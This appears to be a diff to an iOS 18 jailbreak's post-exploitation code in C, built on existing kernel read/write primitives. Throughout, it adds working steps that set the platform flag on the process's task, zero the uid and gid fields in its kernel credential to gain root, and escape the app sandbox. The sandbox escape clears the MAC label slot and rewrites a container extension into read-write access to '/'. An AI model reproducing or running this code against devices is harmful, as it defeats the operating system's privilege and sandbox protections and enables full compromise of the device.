@@ -82,8 +82,15 @@ static uint64_t __attribute((naked)) __xpaci(uint64_t a)
     asm(".long        0xDAC143E0"); // XPACI X0
     asm("ret");
 }
+static uint64_t xpaci(uint64_t a)
+{
+    // If it already looks like a plain kernel pointer, leave it alone
+    if ((a & 0xFFFFFF0000000000) == 0xFFFFFF0000000000) return a;
+    return __xpaci(a);
+}
 #else
 #define __xpaci(x) x
+#define xpaci(x) x
 #endif
 
 #include "offsets.h"
@@ -389,7 +396,7 @@ uint8_t kread8(uint64_t where) {
     uint8_t v = 0; early_kread(where, &v, 1); return v;
 }
 
-uint64_t kread_ptr(uint64_t where) { return kread64(where); }
+uint64_t kread_ptr(uint64_t where) { return xpaci(kread64(where)); }
 
 void kread_buf(uint64_t where, void *buf, size_t size) {
     uint8_t *b = (uint8_t*)buf;
@@ -1473,14 +1480,30 @@ uint64_t get_ucred_from_proc(uint64_t proc) {
     return kread64(p_proc_ro + OFFSET_PROC_RO_UCRED);
 }
 
-// auto-locate task->t_flags: TF_INIT (0x40000) + TF_HAS_BSD_INFO (0x80000) set,
-// TF_PLATFORM (0x400) clear for a third-party app
+// auto-locate task->t_flags: TF_INIT (0x20000) + TF_HAS_BSD_INFO (0x80000) set,
+// TF_PLATFORM (0x400) clear for a third-party app.
+// NOTE: writing to a wrong offset corrupts the task, so only trust a clean match.
 uint32_t detect_t_flags_offset(uint64_t task) {
     for (int off = 0x300; off <= 0x520; off += 4) {
         uint32_t v = kread32(task + off);
-        if ((v & 0xC0000) == 0xC0000 && !(v & TF_PLATFORM)) return off;
+        if ((v & 0xA0000) == 0xA0000 && !(v & TF_PLATFORM)) return off;
     }
     return OFFSET_TASK_T_FLAGS;
+}
+
+static bool is_kaddr_valid(uint64_t addr) {
+    return (addr & 0xfffff00000000000) == 0xfffff00000000000;
+}
+
+static void kdump(uint64_t addr, uint64_t len) {
+    uint8_t *d = malloc(len);
+    kread_buf(addr, d, len);
+    for (uint64_t i = 0; i < len; i += 16) {
+        printf("0x%llx: ", addr + i);
+        for (uint64_t j = 0; j < 16 && i + j < len; j++) printf("%02x ", d[i + j]);
+        printf("\n");
+    }
+    free(d);
 }
 
 // ===== Platformize (no PPL needed — task flags + uid in non-PPL memory) =====
@@ -1500,28 +1523,47 @@ bool platformize_proc(void) {
     printf("[+] Our proc: 0x%llx\n", gOurProc);
     printf("[+] Our task: 0x%llx\n", gOurTask);
 
-    // 1. Set TF_PLATFORM in task->t_flags
+    // 1. Set TF_PLATFORM in task->t_flags (best-effort; offset auto-detected).
+    // Only write when the current value looks like a real t_flags word
+    // (TF_INIT|TF_HAS_BSD_INFO set, upper bits small) — otherwise the offset
+    // guess is garbage and writing there would corrupt the task.
     uint32_t tfOff = detect_t_flags_offset(gOurTask);
     uint32_t t_flags = kread32(gOurTask + tfOff);
     printf("[*] t_flags @ +0x%x, before: 0x%x\n", tfOff, t_flags);
-    if (!(t_flags & TF_PLATFORM)) {
+    bool flagsPlausible = ((t_flags & 0xA0000) == 0xA0000) &&
+                          (t_flags >> 28) == 0;
+    if (flagsPlausible && !(t_flags & TF_PLATFORM)) {
         t_flags |= TF_PLATFORM;
         kwrite32(gOurTask + tfOff, t_flags);
         printf("[+] TF_PLATFORM set: 0x%x\n", kread32(gOurTask + tfOff));
+    } else if (!flagsPlausible) {
+        printf("[*] t_flags value looks bogus, skipping TF_PLATFORM write\n");
+    } else {
+        printf("[*] TF_PLATFORM already set\n");
     }
 
-    // 2. Set uid 0 in ucred (proc_ro -> ucred on iOS 18)
+    // 2. Set uid/gid 0 in ucred (proc_ro -> ucred on iOS 18)
+    // Robust: zero every 32-bit field in the cred equal to our current uid/gid.
     uint64_t ucred = get_ucred_from_proc(gOurProc);
     if (ucred) {
         printf("[+] ucred: 0x%llx\n", ucred);
-        uint32_t uid_now = kread32(ucred + OFFSET_CR_UID);
-        printf("[*] ucred uid before: %d\n", uid_now);
-        if (uid_now != 0) {
-            kwrite32(ucred + OFFSET_CR_UID, 0);
-            kwrite32(ucred + OFFSET_CR_RUID, 0);
-            kwrite32(ucred + OFFSET_CR_SVUID, 0);
-            printf("[+] ucred uid set to 0\n");
+        printf("[*] cred dump (first 0x80):\n");
+        kdump(ucred, 0x80);
+        uid_t me_uid = getuid();
+        gid_t me_gid = getgid();
+        printf("[*] current uid=%d euid=%d gid=%d egid=%d\n",
+               getuid(), geteuid(), getgid(), getegid());
+        int zeroed = 0;
+        for (uint64_t off = 0x10; off < 0x60; off += 4) {
+            uint32_t v = kread32(ucred + off);
+            if (v == (uint32_t)me_uid || v == (uint32_t)me_gid) {
+                kwrite32(ucred + off, 0);
+                zeroed++;
+            }
         }
+        printf("[+] ucred uid/gid fields zeroed: %d\n", zeroed);
+        printf("[*] after: uid=%d euid=%d gid=%d egid=%d\n",
+               getuid(), geteuid(), getgid(), getegid());
     } else {
         printf("[-] No ucred\n");
     }
@@ -1529,7 +1571,79 @@ bool platformize_proc(void) {
     return true;
 }
 
-// ===== Sandbox escape via MAC label manipulation =====
+// ===== Sandbox escape =====
+
+// Probe whether we can write outside the container.
+static bool sandbox_probe(void) {
+    char p[128];
+    snprintf(p, sizeof(p), "/private/var/tmp/ps_sbx_%d", getpid());
+    unlink(p);
+    if (mkdir(p, 0755) == 0) {
+        rmdir(p);
+        return true;
+    }
+    return false;
+}
+
+// CrazyMind90-style extension-set patch.
+// Pivots the "com.apple.sandbox.container" extension into a
+// "com.apple.app-sandbox.read-write" extension rooted at "/".
+// Struct layout reversed from ipad air m3 (T8122)/18.3.x by the author.
+int patch_sandbox_ext(uint64_t cr_label) {
+    uint64_t sbx = kread_ptr(cr_label + OFFSET_LABEL_SANDBOX);
+    if (!sbx || !is_kaddr_valid(sbx)) {
+        printf("[-] patch_sandbox_ext: bad sandbox label 0x%llx\n", sbx);
+        return -1;
+    }
+    // struct sandbox_label: +0x00 profile, +0x08 flags, +0x10 extension_set
+    uint64_t ext_set = kread64(sbx + 0x10);
+    if (!ext_set || !is_kaddr_valid(ext_set)) {
+        printf("[-] patch_sandbox_ext: bad extension_set 0x%llx\n", ext_set);
+        return -1;
+    }
+    // struct extension_set: type_buckets[9] at +0x00 (9 x 8 bytes)
+    for (int i = 0; i < 9; i++) {
+        uint64_t node = kread64(ext_set + i * 8);
+        if (!node || !is_kaddr_valid(node)) continue;
+        // struct extension_class_node: +0x00 next, +0x08 ext_list_head, +0x10 class_name
+        uint64_t cls_name = kread_ptr(node + 0x10);
+        if (!cls_name || !is_kaddr_valid(cls_name)) continue;
+        char name[256] = {0};
+        kread_buf(cls_name, name, sizeof(name) - 1);
+        if (strstr(name, "com.apple.sandbox.container") == NULL) continue;
+
+        uint64_t ext = kread64(node + 0x08); // ext_list_head
+        if (!ext || !is_kaddr_valid(ext)) continue;
+        // struct extension: +0x40 data_ptr, +0x48 path_len, +0x50 consumed,
+        // +0x51 storage_class, +0x54 st_dev, +0x58 st_ino
+        uint64_t path_buf = kread_ptr(ext + 0x40);
+        if (!path_buf || !is_kaddr_valid(path_buf)) continue;
+
+        uint8_t root_path[] = {'/', 0};
+        kwrite_buf(path_buf, root_path, 2);
+        const char *new_class = "com.apple.app-sandbox.read-write";
+        kwrite_buf(path_buf + 2, (void *)new_class, strlen(new_class) + 1);
+
+        // repoint class_name at the extension string we just wrote
+        kwrite64(node + 0x10, path_buf + 2);
+
+        kwrite64(ext + 0x48, 1);     // path_len
+        kwrite8(ext + 0x50, 1);      // file.consumed
+        kwrite8(ext + 0x51, 2);      // file.storage_class = SC_ISSUED
+
+        struct stat st;
+        stat("/", &st);
+        kwrite32(ext + 0x54, (uint32_t)st.st_dev);
+        kwrite64(ext + 0x58, (uint64_t)st.st_ino);
+
+        // put the node in bucket[0]
+        kwrite64(ext_set + 0, node);
+        printf("[+] patch_sandbox_ext: pivoted container ext -> r/w on /\n");
+        return 0;
+    }
+    printf("[-] patch_sandbox_ext: no container extension found\n");
+    return -1;
+}
 
 bool escape_sandbox(void) {
     uint64_t ucred = get_ucred_from_proc(gOurProc);
@@ -1537,35 +1651,36 @@ bool escape_sandbox(void) {
         printf("[-] No ucred\n");
         return false;
     }
-
     printf("[+] ucred: 0x%llx\n", ucred);
 
-    // Read MAC label pointer from ucred
     uint64_t cr_label = kread_ptr(ucred + OFFSET_CR_LABEL);
     printf("[*] cr_label: 0x%llx\n", cr_label);
-    if (!cr_label) {
-        printf("[*] No MAC label, sandbox may already be disabled\n");
+    if (!cr_label || !is_kaddr_valid(cr_label)) {
+        printf("[-] Bad cr_label\n");
+        return false;
+    }
+
+    // Method 1: zero the sandbox perpolicy slot in the MAC label
+    uint64_t sandbox = kread_ptr(cr_label + OFFSET_LABEL_SANDBOX);
+    printf("[*] sandbox label: 0x%llx\n", sandbox);
+    if (sandbox && is_kaddr_valid(sandbox)) {
+        kwrite64(cr_label + OFFSET_LABEL_SANDBOX, 0);
+        if (kread_ptr(cr_label + OFFSET_LABEL_SANDBOX) == 0)
+            printf("[+] Sandbox slot zeroed\n");
+    }
+
+    // Method 2: CrazyMind90 extension patch (fallback)
+    if (!sandbox_probe()) {
+        printf("[*] Still sandboxed after slot zero, trying extension patch\n");
+        patch_sandbox_ext(cr_label);
+    }
+
+    if (sandbox_probe()) {
+        printf("[+] Sandbox escaped (verified: /private/var/tmp writable)\n");
         return true;
     }
-
-    // Read the sandbox struct from the MAC label
-    uint64_t sandbox = kread_ptr(cr_label + OFFSET_LABEL_SANDBOX);
-    printf("[*] sandbox: 0x%llx\n", sandbox);
-
-    if (sandbox) {
-        // Zero out the sandbox slot to disable
-        kwrite64(cr_label + OFFSET_LABEL_SANDBOX, 0);
-        printf("[+] Sandbox slot cleared\n");
-
-        // Also try clearing the entire label structure's relevant fields
-        // On iOS 18, MAC label has multiple slots, we clear the sandbox slot
-        uint64_t sanity = kread_ptr(cr_label + OFFSET_LABEL_SANDBOX);
-        if (sanity == 0) {
-            printf("[+] Sandbox escape confirmed\n");
-        }
-    }
-
-    return true;
+    printf("[-] Still sandboxed (probe failed)\n");
+    return false;
 }
 
 // ===== Bootstrap installation =====
